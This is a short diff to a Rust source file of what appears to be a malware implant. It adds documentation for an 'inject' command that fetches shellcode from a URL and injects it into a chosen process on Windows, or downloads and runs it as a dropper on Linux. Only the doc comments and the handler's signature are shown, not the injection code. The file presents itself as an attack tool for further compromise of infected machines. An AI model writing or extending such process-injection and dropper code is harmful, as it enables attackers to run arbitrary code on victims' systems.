@@ -5,6 +5,13 @@ use std::error::Error;
 #[cfg(windows)] use std::ptr;
 #[cfg(windows)] use reqwest::Client;
 
+/// Shellcode-based attacks for further compromise.
+/// 
+/// On Windows, this will attempt process injection.
+/// 
+/// Usage: `inject [shellcode_url] [pid]`
+/// 
+/// On Linux, the payload will be downloaded and executed like a regular dropper.
 pub async fn handle(s: &String) -> Result<String, Box<dyn Error>> {
     #[cfg(windows)] {
         // Input: url to shellcode -p pid
